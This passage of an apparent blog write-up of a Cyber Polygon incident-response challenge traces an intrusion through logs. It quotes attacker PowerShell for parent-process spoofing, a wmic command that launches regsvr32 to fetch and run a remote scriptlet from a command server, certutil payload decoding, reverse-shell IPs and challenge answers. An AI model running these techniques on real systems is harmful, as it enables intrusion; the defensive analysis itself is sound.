<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="no">[int]</span><span class="nv">$ppid</span> <span class="p">=</span> <span class="nb">Get-Process</span> <span class="n">-Name</span> <span class="s2">&#34;winlogon&#34;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-expand</span> <span class="n">ID</span>
</span></span><span class="line"><span class="cl"><span class="nv">$spawnTo</span> <span class="p">=</span> <span class="s2">&#34;c:\Windows\System32\dwm.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$currdir</span> <span class="p">=</span> <span class="s2">&#34;c:\Windows\System32&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$cmdline</span> <span class="p">=</span> <span class="s2">&#34;dwm.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$sInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">StartupInfo</span>
</span></span><span class="line"><span class="cl"><span class="nv">$sInfoEx</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">STARTUPINFOEX</span>
</span></span><span class="line"><span class="cl"><span class="nv">$pInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PROCESS_INFORMATION</span>
</span></span><span class="line"><span class="cl"><span class="nv">$SecAttr</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">SECURITY_ATTRIBUTES</span>
</span></span><span class="line"><span class="cl"><span class="nv">$SecAttr</span><span class="p">.</span><span class="n">nLength</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$SecAttr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$sInfo</span><span class="p">.</span><span class="n">cb</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$sInfoEx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$lpSize</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
</span></span><span class="line"><span class="cl"><span class="nv">$sInfoEx</span><span class="p">.</span><span class="n">StartupInfo</span> <span class="p">=</span> <span class="nv">$sInfo</span>
</span></span><span class="line"><span class="cl"><span class="nv">$hSpoofParent</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">OpenProcess</span><span class="p">(</span><span class="n">0x1fffff</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$ppid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$lpValue</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
</span></span><span class="line"><span class="cl"><span class="nv">$lpValue</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">AllocHGlobal</span><span class="p">(</span><span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">WriteIntPtr</span><span class="p">(</span><span class="nv">$lpValue</span><span class="p">,</span> <span class="nv">$hSpoofParent</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$result1</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span><span class="p">,</span> <span class="n">1</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$lpSize</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$sInfoEx</span><span class="p">.</span><span class="n">lpAttributeList</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">AllocHGlobal</span><span class="p">(</span><span class="nv">$lpSize</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$result1</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="nv">$sInfoEx</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="n">1</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$lpSize</span><span class="p">)</span>
</span></span></code></pre></div><p>The chain of execution is as follows: powershell.exe 7324 -&gt; winlogon 1160 -&gt; dwm.exe 8876 -&gt; rundll.32 8344.</p>
<p>I could not understand, why my answers are not correct. I&rsquo;ve found the correct chain of events using the following technique:</p>
<ol>
<li>By reverse engineering the <code>mso1033.ps1</code> script I know, that it searched for winlogon PID and spawns dwm.exe spoofing the parent process. It seems to be winlogon, when it&rsquo;s obviously powershell.exe. That&rsquo;s why we need to look for all events where <code>proc_p_file_path: *winlogon AND proc_file_path: *dwm.exe</code>. In other words, all events where the parent is winlogon and the child is dwm.exe. There are several instances where winlogon spawns dwm.exe. Why? Because <code>dwm.exe</code> <em>is</em> usually the child of <code>winlogon.exe</code>.</li>
<li>Also from reverse engineering the script mentioned above, I know that the PE saved in registry is then injected into <code>rundll32.exe</code>, spawned by this <code>dwm.exe</code>.</li>
<li>So, the actual chain of events observed in logs is: winlogon.exe 1160 (spoofed) -&gt; dwm.exe 8876 -&gt; rundll32.exe 8344. However, in reality it is powershell.exe 7324 -&gt; dwm.exe 8876 -&gt; rundll32.exe 8344.</li>
</ol>
<p>So, here are the answers:</p>
<blockquote>
<p>PID of the initial legitimate system process, which was spawned by the script and where this script launched in-memory execution of malicious code;</p>
</blockquote>
<p>This is dwm.exe, 8876, spawned by powershell.exe.</p>
<blockquote>
<p>PID of the target process, to which malicious code migrated from the initial process and in the context of which attacker performed different post-exploitation activity</p>
</blockquote>
<p>The script spoofed parent id to <code>winlogon.exe</code>, 1160, making it look like winlogon performed all those crappy 💩 stuff. I don&rsquo;t understand, why they are saying &ldquo;migrated&rdquo;. Yes,  attacker did perform other things in the context of winlogon.exe. The code from the registry was PE reflected into dwm.exe process created, but not into winlogon.exe.</p>
<h3 id="10-c2c">10. C2C</h3>
<p><em>The malicious code run by the script is a Reverse Shell. Identify the IP address and port number of its command center.</em></p>
<p>So, ps1 scripts runs this small piece of code from the registry within the dwm.exe address space. This code performs this combined technique (Process Hollowing + SIP) with rundll32.exe process, writing shellcode into its memory. So, I am going to look through the rundll32.exe&rsquo;s activity (PID 8344): <code>proc_id: 8344</code> and the timeframe 🕰 <code>23:00 - 23:59</code>.</p>
<p><code>94.177.253.126:443</code></p>
<h3 id="11-path-of-and-hash-of-bloodhound">11. Path of and Hash of Bloodhound</h3>
<p><em>As a result of running a malicious code, which we talk about in questions 9 and 10, the attacker got a shell on the compromised host. Using this access, the attacker downloaded the Active Directory collection utility to the host in an encoded form. Specify a comma-separated, non-spaced link where the encoded version of the utility was downloaded and a SHA256 hash of the decoded version that was directly run by the attacker on the compromised host.</em></p>
<p><code>event_type=FileCreate</code>  and the timeframe is a little extended to the right: up to the next day, 3pm.</p>
<p>event_type=ProcessCreate, timeframe narrowed now. Seems strange, winlogon spawning cmd.exe. How ok is that? Seems not ok according to the first search <a href="https://car.mitre.org/analytics/CAR-2014-11-008/">result</a>. Let&rsquo;s use the cmd.exe&rsquo;s PID as a filter and see what it has done and its privileges. At the moment it seems it has SYSTEM privileges which is definetelu NOT ok.</p>
<p>PID 9316 cmd.exe -&gt; temp\svchost.exe</p>
<p>PID 5868 winlogon -&gt; cmd.exe</p>
<p>Filter for proc_id:5868. Aha! Several injections as well. Seems to be injection code into conhost.exe, net.exe (4272), tasklist.exe (1128), findstr.exe (2268), rundll32.exe (4760), net1.exe (6020). Now let&rsquo;s do proc_p_id:5868.</p>
<p>EB41B254964FB046656A7312C8547674577C4A2229360CC12F5B1289280B92C3</p>
<h3 id="12-memory-dump">12. Memory dump</h3>
<p><em>During the post-exploitation process, the attacker used one of the standard Windows utilities to create a memory dump of a sensitive system process that contains credentials of active users in the system. Specify the name of the executable file of the utility used and the name of the memory dump file created, separated by a comma without spaces.</em></p>
<h3 id="13-login-and-password-of-a-privileges-account">13. Login And Password of a privileges account</h3>
<p><em>Presumably, the attacker extracted the password of one of the privileged accounts from the memory dump we discussed in the previous question and used it to run a malicious code on one of the domain controllers. What account are we talking about? Specify its username and password as the answer in login:password format.</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">NOT Category: DNS query initiated
</span></span><span class="line"><span class="cl">NOT Category: Library Loaded
</span></span><span class="line"><span class="cl">NOT EventCategory:Success Audit
</span></span><span class="line"><span class="cl">NOT wmi_usr_fullname:CYBERCORP<span class="se">\i</span>nventory
</span></span><span class="line"><span class="cl">NOT proc_p_usr_fullname:CYBERCORP<span class="se">\i</span>nventory
</span></span><span class="line"><span class="cl">net_dst_ipv4:192.168.184.100
</span></span></code></pre></div><p>Found a command: <code>regsvr32 /s /n /u /i:http://94.177.253.126:8080/Ec9KoocK.sct scrub.dll</code>. This was launched by the same old <code>wmic</code>. Then I&rsquo;ve set the filter for <code>Ec9KoocK</code> as a keyword and strangely enough nothing was found. No, literally nothing, not even the above mentioned event. Added <code>*</code> at the beggining and the end of this string and got one event in response.</p>
<p>The <code>wmic</code> process which created another process. Opened it and saw the command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wmic  /node:192.168.184.100 /user:inventory /password:<span class="o">[</span>somepassword<span class="o">]</span> process call create <span class="s1">&#39;regsvr32 /u /n /s /i:http://94.177.253.126:8080/Ec9KoccK.sct scrobj.dll&#39;</span>
</span></span></code></pre></div><p>I wonder, if adding these <code>*</code> before and after <code>password</code> would have helped finding the process faster. Yes&hellip; . I&rsquo;ve tried searching for <code>password</code> instead and got almoust not results. Without the <code>*</code> I was only getting those events that contained this word preceeded or followed by spaces. In case of the above command it was not, it&rsquo;s one string with the <code>/</code> and <code>:</code>. Yeah, if only I knew, this would spead up the process a lot 😃.</p>
<p>By the way, what&rsquo;s the <code>Ec9KoocK.sct</code> then? At first I thought that this is somehow decrypted and the password is stored there. But from the command above that&rsquo;s obvious that this is not the case. Since PowerShell was used to decrypt the file, it was logged in WindowsPowerShell event logs with the script body itself. Decrypting it with the below python 🐍 script showed me that this is some injection of a shellcode.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">string</span><span class="o">=</span><span class="s2">&#34;thisbighugevalue&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/username/cases/CyberPolygon2/malicious3&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">exe</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">),</span> <span class="mi">15</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span> 
</span></span></code></pre></div><h3 id="14-group-sid-of-the-compromised-account">14. Group SID of the compromised account</h3>
<p><em>A compromised user account is a member of two Built-in privileged groups on the Domain Controller. The first group is the Administrators. Find the second group. Provide the SID of this group as an answer.</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>NOT Category: DNS query initiated<span class="o">)</span> AND <span class="o">(</span>NOT Category: Library Loaded<span class="o">)</span> AND <span class="o">(</span>NOT EventCategory:Success Audit<span class="o">)</span>
</span></span></code></pre></div><p>Inventory data of host [&hellip;] provides the list of users and groups. There is an Administators group that contained the following data:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sid&#34;</span><span class="p">:</span> <span class="s2">&#34;S-1-5-32-544&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;BUILTIN\\Administrators&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;members&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CYBERCORP\\Administrator&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CYBERCORP\\Enterprise Admins&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CYBERCORP\\Domain Admins&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CYBERCORP\\inventory&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="err">,</span>
</span></span></code></pre></div><p>Checked the <code>inventory</code> account, it is also in another group:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sid&#34;</span><span class="p">:</span> <span class="s2">&#34;S-1-5-32-551&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;BUILTIN\\Backup Operators&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;members&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CYBERCORP\\backupsrv&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CYBERCORP\\inventory&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="err">,</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sid&#34;</span><span class="p">:</span> <span class="s2">&#34;S-1-5-21-3899523589-2416674273-2941457644-1105&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;CYBERCORP\\Workstation Administrators&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;members&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CYBERCORP\\john.goldberg&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;CYBERCORP\\inventory&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Only the first one is also a <code>BUILTIN</code> group.</p>
<h3 id="ip-address-for-reverse-shell">IP address for Reverse Shell</h3>
<p><em>As a result of malicious code execution on the domain controller using a compromised account, the attacker got a reverse shell on that host. This shell used a previously not seen IP address as the command center. Specify its address as the answer.</em></p>
<p>While getting the #13 answered, I&rsquo;ve notices an IP connection that seemed suspicious. Was a pure intuition.</p>
<h2 id="strategy">Strategy</h2>
<h3 id="timeline">Timeline</h3>
<p>📆 <code>21/06/2021</code></p>
<p>⏰ <code>23:25:08</code></p>
<p><code>report.zip</code> was created by outlook.exe proccess (FileCreate). <code>report (00000002).zip</code> was also created at the same very path. <strong>Path</strong> 🛣:</p>
<p>⏰ <code>23:25:32</code></p>
<p>Looks like beaconing. Sec 32&hellip;sec 35&hellip;sec38. Sec 38 - three requests in a row. Originated from <code>winword.exe</code>.</p>
<p>⏰ <code>23:25:50</code></p>
<p>WMI command was executed. Filter created?</p>
<p>⏰ <code>23:25:57</code></p>
<p>Ieproxy.dll is loaded by winword. Then a request to some raw.githubusercontent.com is made.</p>
<p>⏰ <code>23:26:03</code></p>
<p>Something was downloaded from raw.githubusercontent.com and saved in registry: hkey_current_user\software\registeredapplications\appxs42fd12c3po92dynnq2r142fs12qhvsmvv. This event also had the value dumped, it&rsquo;s a base64 encoded string.</p>
<p>⏰ <code>23:26:09</code></p>
<p>Using the same ieproxy.dll COM technique, winword.exe downloaded the second file, this time a PowerShell script: mso1033.ps1.</p>
<p>PowerControl Consumer was created.</p>
<p>⏰ <code>23:34:01</code> winlogon spawns dwm.exe, started by the ps1 script.</p>
<p>⏰ <code>23:46:10</code></p>
<p>Several download requests made via <code>cmd.exe</code> -&gt; <code>certutil.exe</code>.</p>
<p>⏰ <code>23:46:16</code></p>
<p>certutil was used to decode the file downloaded and saved as at <code>C:\Windows\TEMP\svchost.exe</code>.</p>
<p>⏰ <code>23:46:17</code></p>
<p>svchost was started (PID 3280) and SHA256 is 88EAE7C94142232FBB961DD8381FAEF23129B9F958BE283AE8393D28FED2092B</p>
<p>⏰ 23:48:10</p>
<p>svchost created goups.json</p>
<p>⏰ 23:48:11</p>
<p>svchost.exe created a file <code>C:\Windows\Temp\20200630024732_bloodhound.zip</code>. <code>proc_id</code> = 9316.</p>
<p>bloodhound.zip, svchost.exe.log, domains.json, ous.json, gpos.json, users.json.</p>
<p>⏰ 23:50:14</p>
<p>dump.bin created with rundll32.exe.</p>
<p>⏰ 00:19:43 powershell established connection with 190.150.52.34:8443</p>
<p>⏰ 00:21:22</p>
<p>cmd.exe created wmic.exe. And the command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wmic  /node:192.168.184.100 /user:inventory /password:<span class="o">[</span>somepassword<span class="o">]</span> process call create <span class="s1">&#39;regsvr32 /u /n /s /i:http://94.177.253.126:8080/Ec9KoccK.sct scrobj.dll&#39;</span>
</span></span></code></pre></div><h2 id="investigation">Investigation</h2>

  </div>
</article>
</div>
</div>

        </div>
      </div>
    </div>
    
  </div>

  <div class="sub-footer">
  <div class="container">
    <div class="row">
      <div class="col-12">
        <div class="sub-footer-inner">
          <ul>
            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>
</div>

  

  
  

  
  <script type="text/javascript" src="/js/scripts.min.bafc052229b4b40bf03c477d31c5cdd9352ece8afbadf35ab97ed14495098fc9.js"></script>
  

  
  
  
    
  


</body>

</html>
